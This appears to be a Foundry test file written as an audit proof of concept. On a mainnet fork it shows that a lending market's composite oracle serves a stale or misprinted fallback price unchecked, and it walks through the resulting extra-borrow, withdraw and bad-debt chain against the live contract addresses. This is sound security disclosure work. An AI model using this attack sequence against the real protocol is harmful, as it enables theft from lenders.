// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {IERC20, IFeed, IMarket, IOracle, IBorrowController, IDBR, IEscrow} from "../src/Interfaces.sol";

interface ICompositeFeed {
    function assetToUsdHeartbeat() external view returns (uint256);
    function assetToUsd() external view returns (address);
    function fallbackFeed() external view returns (address);
}

interface IAggregator {
    function aggregator() external view returns (address);
    function minAnswer() external view returns (int256);
    function maxAnswer() external view returns (int256);
}

/// L-4: ChainlinkBasePriceFeed's fallback leg is consumed with NO staleness
/// check and NO bounds check, and the composite reports the FALLBACK's
/// updatedAt as its own. Consequences proven on a local mainnet fork with
/// the real WETH market (real deployed composite feed, real BorrowController):
///
///  1. The primary signals failure by going stale (heartbeat 3660s). The
///     composite then silently substitutes the RedStone fallback. The
///     fallback's data is served however old it gets: at 20h of age the
///     feed's OWN staleness predicate (updatedAt + heartbeat < now, the
///     exact first clause of its isPriceStale) condemns it, yet it is
///     served, and BorrowController.isPriceStale(market) is still FALSE
///     because the market threshold is 86460s (~24h). The borrow gate --
///     the one path L-2 showed IS gated -- waves borrows through on
///     fallback data up to ~24h old. This is the fallback-specific root:
///     in L-2 the gate SAW the halt and blocked borrows; here the gate is
///     blind because the composite launders the fallback's age into a
///     passing grade against a 24h threshold the fallback was never
///     held to (its own relay cadence is ~10-60 min when alive).
///  2. Full loss chain: position opened at P0; primary halts; fallback
///     freezes at P0 while the true price falls 30%; attacker borrows MORE
///     (gate defeated) and withdraws to the stale limit; fallback resumes
///     at the true price; max liquidation leaves bad debt.
///  3. Boundary: the gate catches the fallback leg only once its age
///     exceeds the 24h market threshold -- ~23h after the feed's own
///     3660s standard condemns the same data.
///  4. Design contrast: the sibling WBTC/BTC base feed has NO fallback;
///     on the identical primary halt it returns updatedAt = 0 (the hard
///     failure signal), the bridge feed propagates 0, and the WBTC
///     market's gate trips immediately.
///  5. No bounds/deviation discipline on the fallback leg either: a fresh
///     fallback print at 3x or 0.01x the true price is served verbatim
///     (feed-level proof; the market cascade for a misprint needs a
///     RedStone network failure, a weaker precondition than a relay
///     stop, so the staleness masking above is the headline claim).
///
/// Scaffolding (not part of the claim): BorrowController operator is
/// impersonated once to allowlist the test borrower (mirrors allowlisted
/// integrator contracts); DOLA dealt to the market (mirrors Fed supply);
/// DBR dealt to the borrower (mirrors DBR held from the open market).
/// The two oracle legs are mocked at the proxy addresses -- exactly what
/// the composite contract sees when a source halts or freezes; the
/// composite, Oracle, BorrowController and Market are the real deployed
/// contracts executing real code.
contract L4FallbackTest is Test {
    uint256 constant FORK_BLOCK = 26438397; // 2026-11-18 ~00:3x UTC head

    address constant MKT = 0x63Df5e23Db45a2066508318f172bA45B9CD37035; // WETH market
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant FEED = 0x22390B88C53D1631f673b8Dcd91860267137b2c8; // ChainlinkBasePriceFeed (WETH)
    address constant PRIMARY = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419; // Chainlink ETH/USD proxy
    address constant FALLBACK = 0x67F6838e58859d612E4ddF04dA396d6DABB66Dc4; // RedStone ETH feed
    address constant DOLA = 0x865377367054516e17014CcdED1e7d814EDC9ce4;
    address constant BC = 0x01ECA33e20a4c379Bd8A5361f896A7dd2bAE4ce8;
    address constant BC_OPERATOR = 0x926dF14a23BE491164dCF93f4c468A50ef659D5B;

    // No-fallback sibling: WBTC/BTC base feed inside the WBTC bridge feed.
    address constant NOFB_FEED = 0x435419607191F1C1c6809E01bb5C38311957c6a8;
    address constant NOFB_PRIMARY = 0xfdFD9C85aD200c506Cf9e21F1FD8dd01932FBB23;
    address constant BRIDGE_FEED = 0xd66b3f73BD85dfb52d01E5EF56dB29B75730B3DC;
    address constant WBTC_MKT = 0x48BA574Edf0bc4E2E40B529863aaA6a67c264E7C;

    address liquidator = address(0x119);

    IMarket mkt = IMarket(MKT);
    IBorrowController bc = IBorrowController(BC);
    IDBR dbr;
    IOracle oracle;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        dbr = IDBR(mkt.dbr());
        oracle = IOracle(mkt.oracle());

        vm.prank(BC_OPERATOR);
        bc.allow(address(this));
        deal(DOLA, MKT, 2_000_000 ether);
        deal(DOLA, liquidator, 1_000_000 ether);
        vm.prank(liquidator);
        IERC20(DOLA).approve(MKT, type(uint256).max);
    }

    /// Faithful re-implementation of the composite's own staleness
    /// predicate (ChainlinkBasePriceFeed.isPriceStale, first clause plus
    /// the aggregator bounds clause) from its public inputs. The function
    /// itself is internal in the deployed source, so it cannot be called
    /// directly; every input here is read from the live contracts.
    function _feedOwnStale(uint256 price18, uint256 updatedAt) internal view returns (bool) {
        if (updatedAt + ICompositeFeed(FEED).assetToUsdHeartbeat() < block.timestamp) return true;
        address agg = IAggregator(ICompositeFeed(FEED).assetToUsd()).aggregator();
        int256 p8 = int256(price18 / 1e10); // primary aggregator answers are 8-dec
        return p8 < IAggregator(agg).minAnswer() || p8 > IAggregator(agg).maxAnswer();
    }

    function _openPosition(uint256 borrowCap) internal returns (uint256 p0, uint256 upd0, uint256 b0) {
        deal(WETH, address(this), 75 ether);
        deal(address(dbr), address(this), 20_000_000 ether);
        IERC20(WETH).approve(MKT, type(uint256).max);
        mkt.deposit(75 ether);
        (, int256 p,, uint256 upd,) = IFeed(FEED).latestRoundData();
        p0 = uint256(p);
        upd0 = upd;
        uint256 limit = mkt.getCreditLimit(address(this));
        b0 = limit * 9 / 10;
        if (b0 > borrowCap) b0 = borrowCap;
        mkt.borrow(b0);
        console.log("position opened: 75 WETH collateral, debt (DOLA):", b0 / 1e18);
        console.log("composite price P0 (1e18):", p0);
        console.log("primary updatedAt age at open (s):", block.timestamp - upd0);
        console.log("market staleness threshold (s):", bc.stalenessThreshold(MKT));
        console.log("feed heartbeat (s):", ICompositeFeed(FEED).assetToUsdHeartbeat());
    }

    function _mockLeg(address leg, uint256 price8, uint256 updatedAt) internal {
        vm.mockCall(
            leg,
            abi.encodeWithSelector(IFeed.latestRoundData.selector),
            abi.encode(uint80(1), int256(price8), updatedAt, updatedAt, uint80(1))
        );
    }

    function _maxLiquidateResidual() internal returns (uint256 residual) {
        for (uint256 i = 0; i < 12; i++) {
            uint256 debt = mkt.debts(address(this));
            if (debt == 0) break;
            if (mkt.getCreditLimit(address(this)) >= debt) break;
            uint256 escBal = IEscrow(mkt.predictEscrow(address(this))).balance();
            if (escBal == 0) break;
            uint256 price = oracle.viewPrice(WETH, mkt.collateralFactorBps());
            uint256 inc = mkt.liquidationIncentiveBps();
            uint256 maxRepay = escBal * price / 1e18 * 10000 / (10000 + inc);
            uint256 factorCap = debt * mkt.liquidationFactorBps() / 10000;
            if (maxRepay > factorCap) maxRepay = factorCap;
            maxRepay = maxRepay * 999 / 1000;
            if (maxRepay == 0) break;
            vm.prank(liquidator);
            try mkt.liquidate(address(this), maxRepay) {} catch {
                break;
            }
        }
        residual = mkt.debts(address(this));
    }

    function test_FallbackMasksStaleness_BorrowAllowed_BadDebt() public {
        (uint256 p0, uint256 upd0, uint256 b0) = _openPosition(100_000 ether);
        uint256 p0_8 = p0 / 1e10;

        // PRIMARY HALTS: frozen at P0 with its last real updatedAt.
        _mockLeg(PRIMARY, p0_8, upd0);
        // FALLBACK relayed P0 "now", then its relayer stops too.
        uint256 fbTs = block.timestamp;
        _mockLeg(FALLBACK, p0_8, fbTs);

        // +2h: primary is beyond the 3660s heartbeat -> composite engages
        // the fallback and reports the FALLBACK's round data as its own.
        vm.warp(block.timestamp + 2 hours);
        vm.roll(block.number + 600);
        {
            (, int256 pc,, uint256 updC,) = IFeed(FEED).latestRoundData();
            assertEq(uint256(pc), p0, "composite serves fallback price");
            assertEq(updC, fbTs, "composite reports the FALLBACK updatedAt as its own");
            console.log("fallback engaged: composite updatedAt == fallback updatedAt:", updC == fbTs);
        }
        // The served data is ALREADY condemned by the feed's own standard
        // (age 2h > heartbeat 3660s) -- and nothing checks it.
        assertTrue(_feedOwnStale(p0, fbTs), "feed's own predicate condemns the served fallback data");

        // +18h more (fallback age ~20h; true ETH price is now -30%,
        // observed by neither source).
        vm.warp(block.timestamp + 18 hours);
        vm.roll(block.number + 5400);
        {
            (, int256 pc2,, uint256 updC2,) = IFeed(FEED).latestRoundData();
            assertEq(uint256(pc2), p0, "composite still serves the frozen fallback price");
            assertEq(updC2, fbTs, "composite still reports the 20h-old fallback updatedAt");
        }
        assertTrue(_feedOwnStale(p0, fbTs), "20h-old fallback data fails the feed's own staleness test");
        assertFalse(bc.isPriceStale(MKT), "BORROW GATE IS BLIND: 20h-old fallback data passes the 86460s threshold");
        console.log("fallback age (h):", (block.timestamp - fbTs) / 3600);
        console.log("bc.isPriceStale(WETH market) at 20h fallback age:", bc.isPriceStale(MKT));

        // HEADLINE (contrast L-2 Control A): the borrow path -- the one
        // path that IS gated -- lets the attacker borrow MORE against the
        // stale valuation, because the gate reads the laundered updatedAt.
        uint256 extra = (mkt.getCreditLimit(address(this)) - mkt.debts(address(this))) / 2;
        mkt.borrow(extra);
        console.log("extra DOLA borrowed against stale fallback valuation:", extra / 1e18);
        assertGt(extra, 1 ether, "attacker must be able to borrow more on stale fallback data");

        // Withdraw to the stale limit as well (ungated path, as in L-2).
        uint256 wlim = mkt.getWithdrawalLimit(address(this));
        mkt.withdraw(wlim);
        console.log("WETH withdrawn at stale valuation:", wlim / 1e18);
        console.log("total debt (DOLA):", mkt.debts(address(this)) / 1e18);

        // FALLBACK RESUMES at the true price (-30%). Primary still halted.
        _mockLeg(FALLBACK, p0_8 * 70 / 100, block.timestamp);
        {
            (, int256 pc3,,,) = IFeed(FEED).latestRoundData();
            assertEq(uint256(pc3), p0_8 * 70 / 100 * 1e10, "composite now serves the resumed true price");
        }
        console.log("collateral value at true price (DOLA):", mkt.getCollateralValue(address(this)) / 1e18);

        uint256 residual = _maxLiquidateResidual();
        console.log("residual debt after max liquidation (= bad debt, DOLA):", residual / 1e18);
        assertGt(residual, 0, "bad debt must remain after max liquidation");
        console.log("total borrowed (DOLA):", (b0 + extra) / 1e18);
        console.log("total withdrawn (WETH):", wlim / 1e18);
    }

    function test_FallbackLive_TracksDrop_NoBadDebt() public {
        (uint256 p0,,) = _openPosition(50_000 ether);
        uint256 p0_8 = p0 / 1e10;
        uint256 staleStyleLimit = mkt.getWithdrawalLimit(address(this));

        // Primary halts, but the fallback is ALIVE and tracks the true
        // -30% move with fresh timestamps throughout.
        (, , , uint256 upd0,) = IFeed(FEED).latestRoundData();
        _mockLeg(PRIMARY, p0_8, upd0);
        uint256 p1_8 = p0_8 * 70 / 100;
        _mockLeg(FALLBACK, p1_8, block.timestamp);
        vm.warp(block.timestamp + 20 hours);
        vm.roll(block.number + 6000);
        _mockLeg(FALLBACK, p1_8, block.timestamp); // relayer still alive after the warp

        (, int256 pc,,,) = IFeed(FEED).latestRoundData();
        assertEq(uint256(pc), p1_8 * 1e10, "live fallback serves the true dropped price");
        assertFalse(bc.isPriceStale(MKT), "gate quiet with a live fallback");

        vm.expectRevert();
        mkt.withdraw(staleStyleLimit);
        console.log("CONTROL passed: stale-sized withdraw reverts when the fallback tracks the true price");

        uint256 trueLimit = mkt.getWithdrawalLimit(address(this));
        mkt.withdraw(trueLimit);
        uint256 residual = _maxLiquidateResidual();
        console.log("residual debt after max liquidation:", residual / 1e18);
        assertTrue(
            residual == 0 || mkt.getCollateralValue(address(this)) >= residual,
            "no bad debt when the fallback is live"
        );
    }

    function test_GateCatchesFallbackOnlyAfter24h_AndMisprintsPassVerbatim() public {
        (uint256 p0, uint256 upd0,) = _openPosition(100_000 ether);
        uint256 p0_8 = p0 / 1e10;
        _mockLeg(PRIMARY, p0_8, upd0);
        uint256 fbTs = block.timestamp;
        _mockLeg(FALLBACK, p0_8, fbTs);

        // +25h: only NOW does the market gate trip on the fallback leg.
        vm.warp(block.timestamp + 25 hours);
        vm.roll(block.number + 7500);
        assertTrue(bc.isPriceStale(MKT), "gate trips only once fallback age exceeds the 86460s threshold");
        vm.expectRevert();
        mkt.borrow(1 ether);
        console.log("boundary proven: gate catches the fallback leg at >24h of age,");
        console.log("~23h after the feed's own 3660s heartbeat standard condemns it");

        // No bounds/deviation check on the fallback leg: fresh prints at
        // 3x and at 0.01x the true price are served verbatim (feed-level).
        _mockLeg(FALLBACK, p0_8 * 3, block.timestamp);
        (, int256 hi,,,) = IFeed(FEED).latestRoundData();
        assertEq(uint256(hi), p0 * 3, "3x fallback misprint served verbatim");
        _mockLeg(FALLBACK, p0_8 / 100, block.timestamp);
        (, int256 lo,,,) = IFeed(FEED).latestRoundData();
        assertEq(uint256(lo), (p0_8 / 100) * 1e10, "0.01x fallback misprint served verbatim (8-dec truncation is the mock's own)");
        console.log("misprint pass-through proven at feed level: 3x and 0.01x both served unchecked");
    }

    function test_NoFallbackSibling_ReturnsZeroUpdatedAt_GateTrips() public {
        // The WBTC/BTC base feed (a leg of the live WBTC bridge feed) has
        // NO fallback configured. Freeze its primary the same way.
        (, int256 pcNow,,,) = IFeed(NOFB_FEED).latestRoundData();
        (, int256 pb,, uint256 updB,) = IFeed(NOFB_PRIMARY).latestRoundData();
        _mockLeg(NOFB_PRIMARY, uint256(pb), updB);
        vm.warp(block.timestamp + 25 hours); // beyond this feed's 86460s heartbeat
        vm.roll(block.number + 7500);

        (, int256 pc,, uint256 updC,) = IFeed(NOFB_FEED).latestRoundData();
        assertEq(uint256(pc), uint256(pcNow), "no-fallback feed still reports the frozen price level");
        assertEq(updC, 0, "but signals failure with updatedAt = 0");
        (, , , uint256 updBridge,) = IFeed(BRIDGE_FEED).latestRoundData();
        assertEq(updBridge, 0, "bridge feed propagates updatedAt = 0 (min of legs)");
        assertTrue(bc.isPriceStale(WBTC_MKT), "WBTC market gate trips immediately on the hard signal");
        console.log("design contrast proven: identical primary halt, no fallback -> updatedAt=0 -> gate trips;");
        console.log("with a fallback configured, the same halt is laundered into a passing updatedAt for ~24h");
    }
}
